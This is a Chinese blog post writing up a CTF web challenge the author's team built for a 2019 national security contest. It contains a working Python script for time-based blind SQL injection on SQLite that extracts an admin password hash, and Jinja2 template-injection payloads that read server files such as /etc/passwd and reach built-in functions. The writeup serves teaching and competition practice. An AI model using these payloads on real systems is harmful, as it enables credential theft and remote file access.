<!doctype html><html lang=zh-cn>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content=" 前言   无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？ 算了，我知道是我太菜。    本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。 尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。  {% asset_img 1.jpeg %}
"><title>2019信安国赛出题经历</title>
<link rel=canonical href=https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="2019信安国赛出题经历">
<meta property="og:description" content=" 前言   无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？ 算了，我知道是我太菜。    本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。 尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。  {% asset_img 1.jpeg %}
">
<meta property="og:url" content="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/">
<meta property="og:site_name" content="零碎记忆">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="Python"><meta property="article:tag" content="数据库"><meta property="article:published_time" content="2019-06-05T15:22:45+00:00"><meta property="article:modified_time" content="2019-06-05T15:22:45+00:00">
<meta name=twitter:site content="@Yukiricc">
<meta name=twitter:creator content="@Yukiricc"><meta name=twitter:title content="2019信安国赛出题经历">
<meta name=twitter:description content=" 前言   无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？ 算了，我知道是我太菜。    本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。 尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。  {% asset_img 1.jpeg %}
">
<link rel="shortcut icon" href=img/favicon.png>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=/ class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>返回</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/>
信息安全
</a>
<a href=/categories/web/>
WEB
</a>
</header>
<h2 class=article-title>
<a href=/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/>2019信安国赛出题经历</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jun 05, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 1 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<blockquote>
<h2 id=前言>前言</h2>
</blockquote>
<ul>
<li>无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？</li>
<li>算了，我知道是我太菜。</li>
</ul>
<hr>
<ul>
<li>本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。</li>
<li>尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。</li>
</ul>
<p>{% asset_img 1.jpeg %}</p>
<blockquote>
<h2 id=more>MORE</h2>
</blockquote>
<ul>
<li>题目名称：不仅仅是个SQL</li>
<li>出题人：CC from nothing</li>
</ul>
<blockquote>
<h3 id=points>POINTS</h3>
</blockquote>
<ol>
<li>基于SQLITE数据库的盲注</li>
<li>基于jinja2模板注入漏洞的任意代码执行漏洞</li>
</ol>
<blockquote>
<h3 id=writeup>WRITEUP</h3>
</blockquote>
<p>{% asset_img 2.jpg %}</p>
<ul>
<li>打开网站首先看到的是一个登陆界面</li>
</ul>
<p>{% asset_img 1.jpg %}</p>
<ul>
<li>照例查看一下网站的robots.txt看一下有没有什么可以发现的。</li>
<li>robots.txt中是网站登陆认证逻辑的源码，可以看出后算是使用python编写，数据库为sqlite。并对用户输入进行了过滤。</li>
</ul>
<p>{% asset_img 2.jpg %}</p>
<ul>
<li>
<p>输入常用payload发现没有任何回显，所以这里需要盲注</p>
</li>
<li>
<p>sqlite3数据库的盲注是采用randomblob()函数
randomblob()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否。</p>
</li>
<li>
<p>经过多次尝试发现后端过滤了小写的select，from等关键词。于是采用如图所示的方式注入</p>
</li>
<li>
<p>我们编写了如下脚本来注入获取密码</p>
<pre tabindex=0><code>def sqlpw(url):
session=requests.Session()
params={&quot;password&quot;:&quot;0&quot;}
password=&quot;&quot;
for i in range(32):
    for x in &quot;0123456789abcdefghijklmnopqrstuvwsyz&quot;:
        try:
            username=&quot;admin'AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex('{}')AND(randomblob(1000000000))--&quot;.format(i+1,x)
            params['username']=username
            # print(params)
            r=session.post(url,data=params,timeout=1)
            # print(r.status_code)
        except exceptions.Timeout:
            password=password+x
            logging.info(password)
            sleep(3)
            break
return password
</code></pre></li>
<li>
<p>运行脚本之后我们就获取到了密码的md5值，利用网上很多的md5查询库便可以得到密码原文</p>
</li>
</ul>
<p>{% asset_img 3.jpg %}</p>
<ul>
<li>使用用户名密码登陆成功之后出现如上的欢迎界面。检查网页源码发现flag位于根目录下</li>
<li>这里的鸟居图片既是另一个提示。jinja2项目的LOGO
{% asset_img 4.png %}</li>
</ul>
<p>{% asset_img 4.jpg %}</p>
<ul>
<li>从URL传入参数username入手写入测试payload验证漏洞存在</li>
</ul>
<p>{% asset_img 5.jpg %}</p>
<ul>
<li>经过测试发现注入点过滤方括号，于是构成如图所示payload完成注入获得flag</li>
</ul>
<blockquote>
<h2 id=jinja2模板注入漏洞>Jinja2模板注入漏洞</h2>
</blockquote>
<ul>
<li>Jinja2漏洞最早出现在py2的版本上。</li>
<li>漏洞原理基本就是传入的url中如果包含python脚本也是会被模板解析的。因为模板能够访问python内置变量以及变量方法。</li>
<li>注意python2和python3存在差别在类层结构上存在差别</li>
</ul>
<pre tabindex=0><code>__class__   返回调用参数类型
__base__    返回基类
__mro__     允许我们在当前Python环境下追溯继承树
__subclasses__()    返回子类
</code></pre><ol>
<li>
<p>获取基类</p>
<p>首先通过str，dict，tuple，list等类型来获取python的基本类（因为python万物皆对象）你也可以通过一些其它jinja2已经导入的包来获取基类</p>
<pre tabindex=0><code>python3:
''.__class__.__base__
[].__class__.__base__
requests.__class__.__base__

python2:
''.__class__.__mro__[2]
[].__class__.__base__
requets.__class__.__mro__[8]
</code></pre><p>获取基类的方法可以在python命令行中输入尝试</p>
<p><strong>如果题目对中括号做了限制，也可以通过__getitem__(2)函数绕过限制</strong></p>
</li>
<li>
<p>读取文件</p>
<p><strong>以下基类通过object代替</strong></p>
<pre tabindex=0><code>python2：
object.__subclasses__()[40]('/etc/password
').read()
//获取file类读文件
</code></pre><p>python3中要复杂的多，首先是python3的类层结构和python2下相比会复杂的多。其次python3的类必须经过初始化等等操作才可以使用其内建函数</p>
<pre tabindex=0><code>python3:
object.__subclasses__()[78].__init__.__globals__.__builtins__.open(&quot;./flag.txt&quot;,encoding=&quot;utf-8&quot;).read()
</code></pre><p>python3中我们获取子类列表之后随便选择一个类，查看其__init__</p>
<pre tabindex=0><code>&lt;slot wrapper '__init__' of 'object' objects&gt;
</code></pre><p>wrapper是指这些函数没有被重载。这是他们并不是function，并不具有___globals__属性。我们在多尝试几个子类就可以找到一个被__init__的类，比如。接下来就可以使用内置函数执行命令。</p>
</li>
</ol>
<p>以上都只是最基础的操作，jinja2模板注入还有很多其他操作需要更多的尝试理解才可以完成。</p>
<blockquote>
<h2 id=后记>后记</h2>
</blockquote>
<ul>
<li>这次比赛真是一个很不愉快的体验。这个题目出题到写博客也隔了很久。所以有些细节在本博客中可能描述的很不清楚。（总之这篇博客很垃圾就是了）在图书馆办公室一边修理爬虫一边跑着爬虫利用闲暇之余写出来的博客真的质量不高令人堪忧。总之就这样吧，感谢阅读。</li>
</ul>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/python/>Python</a>
<a href=/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/>数据库</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
</article>
<aside class=related-contents--wrapper>
</aside>
<footer class=site-footer>
<section class=copyright>
&copy;
2017 -
2021 零碎记忆
</section>
<section class=powerby>
Try to remember <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.5.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#前言>前言</a></li>
<li><a href=#more>MORE</a>
<ol>
<li><a href=#points>POINTS</a></li>
<li><a href=#writeup>WRITEUP</a></li>
</ol>
</li>
<li><a href=#jinja2模板注入漏洞>Jinja2模板注入漏洞</a></li>
<li><a href=#后记>后记</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>